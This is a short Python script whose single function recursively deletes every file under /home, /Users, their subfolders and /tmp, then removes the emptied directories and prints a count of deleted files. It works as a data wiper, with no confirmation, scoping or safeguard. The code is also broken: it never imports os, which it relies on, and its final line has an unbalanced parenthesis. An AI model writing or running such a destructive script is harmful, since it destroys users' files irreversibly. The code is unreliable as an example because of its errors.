import sys

def delete_user_files():
    # Define potential user directories
    user_dirs = [
        '/home',
        '/Users',
        '/home/*',
        '/Users/*',
        '/tmp'
    ]

    deleted_count = 0
    errors = []

    for base_dir in user_dirs:
        try:
            # Use os.path.expanduser and glob patterns
            if '*' in base_dir:
                import glob
                expanded_dirs = glob.glob(base_dir)
            else:
                expanded_dirs = [base_dir] if os.path.exists(base_dir) else []

            for directory in expanded_dirs:
                if os.path.isdir(directory):
                    for root, dirs, files in os.walk(directory, topdown=False):
                        for file_name in files:
                            file_path = os.path.join(root, file_name)
                            try:
                                os.remove(file_path)
                                deleted_count += 1
                            except (PermissionError, OSError) as e:
                                errors.append(f"Failed to delete {file_path}: {str(e)}")

                        # Remove empty directories
                        for dir_name in dirs:
                            dir_path = os.path.join(root, dir_name)
                            try:
                                os.rmdir(dir_path)
                            except (PermissionError, OSError) as e:
                                if "Directory not empty" not in str(e):
                                    errors.append(f"Failed to remove directory {dir_path}: {str(e)}")
        except Exception as e:
            errors.append(f"Error processing directory {base_dir}: {str(e)}")

    return {
        'deleted_files': deleted_count,
        'errors': errors
    }

if __name__ == "__main__":
    result = delete_user_files()
    print(f"Deleted {result['deleted_files']} files")
    if result['errors']:
        print("Errors encountered:")
        for error in result['errors'][:5]:  # Show first 5 errors
            print(f"  - {error}")
        if len(result['errors']) > 5:
            print(f"  ... and {len(result['errors']) - 5} more errors")
    else:
        print("No errors encountered"))
